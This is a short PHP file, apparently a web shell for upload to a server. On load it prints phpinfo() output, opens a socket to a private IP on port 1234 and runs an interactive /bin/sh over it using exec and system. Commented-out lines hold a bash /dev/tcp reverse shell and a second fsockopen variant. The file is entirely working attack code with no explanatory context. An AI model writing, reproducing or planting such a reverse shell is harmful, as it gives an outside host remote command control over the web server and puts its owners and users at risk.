

<?php




#$ip = '192.168.8.3';
#$port = 1234;
#$payload = "/bin/bash -c 'bash -i >& /dev/tcp/$ip/$port 0>&1'"; 
#$sock=fsockopen("192.168.126.130",2134);exec("/bin/sh -i <&3 >&3 2>&3");
#system($payload);

phpinfo();
$ip = '192.168.18.3';
$port = 1234;
$sock=fsockopen("192.168.18.3",1234);
exec("/bin/sh -i <&3 >&3 2>&3");
system("/bin/sh -i <&3 >&3 2>&3");

?>